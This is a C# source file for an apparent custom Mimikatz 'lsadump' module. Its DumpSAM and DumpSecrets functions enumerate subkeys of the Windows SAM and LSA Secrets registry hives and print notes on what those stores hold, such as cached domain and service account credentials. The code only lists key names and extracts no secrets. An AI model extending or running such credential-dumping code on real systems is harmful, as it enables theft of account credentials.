using System;
using Microsoft.Win32;

namespace MimikatzCustom.Modules
{
    public class LsadumpModule
    {
        public static void DumpSAM()
        {
            try
            {
                Console.WriteLine("[*] Accessing SAM Registry...");
                
                // SAM is typically not readable without admin/SYSTEM privileges
                try
                {
                    using (RegistryKey samKey = Registry.LocalMachine.OpenSubKey(@"SAM\SAM\Domains"))
                    {
                        if (samKey != null)
                        {
                            Console.WriteLine("[+] SAM Registry accessible");
                            string[] subNames = samKey.GetSubKeyNames();
                            foreach (string subName in subNames)
                            {
                                Console.WriteLine($"    [{subName}]");
                            }
                        }
                        else
                        {
                            Console.WriteLine("[!] Cannot access SAM registry (requires SYSTEM/admin privileges)");
                        }
                    }
                }
                catch (UnauthorizedAccessException)
                {
                    Console.WriteLine("[!] Access Denied - SAM requires administrator or SYSTEM privileges");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error accessing SAM: {ex.Message}");
                }

                Console.WriteLine();
                Console.WriteLine("[*] Note: Real SAM dumping requires:");
                Console.WriteLine("    - Administrator privilege");
                Console.WriteLine("    - Access to SYSTEM account credentials");
                Console.WriteLine("    - Direct memory or registry attacks");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error in DumpSAM: {ex.Message}");
            }
        }

        public static void DumpSecrets()
        {
            try
            {
                Console.WriteLine("[*] Accessing LSA Secrets...");

                try
                {
                    using (RegistryKey lsaKey = Registry.LocalMachine.OpenSubKey(@"SECURITY\Policy\Secrets"))
                    {
                        if (lsaKey != null)
                        {
                            Console.WriteLine("[+] LSA Secrets found:");
                            string[] secretNames = lsaKey.GetSubKeyNames();
                            foreach (string secretName in secretNames)
                            {
                                if (!secretName.StartsWith("_"))
                                {
                                    Console.WriteLine($"    [{secretName}]");
                                }
                            }
                        }
                        else
                        {
                            Console.WriteLine("[!] Cannot access LSA Secrets (requires SYSTEM privileges)");
                        }
                    }
                }
                catch (UnauthorizedAccessException)
                {
                    Console.WriteLine("[!] Access Denied - LSA Secrets require SYSTEM privileges");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error accessing LSA Secrets: {ex.Message}");
                }

                Console.WriteLine();
                Console.WriteLine("[*] LSA Secrets typically include:");
                Console.WriteLine("    - DPAPI machine keys");
                Console.WriteLine("    - Cached domain credentials");
                Console.WriteLine("    - Service account credentials");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error in DumpSecrets: {ex.Message}");
            }
        }
    }
}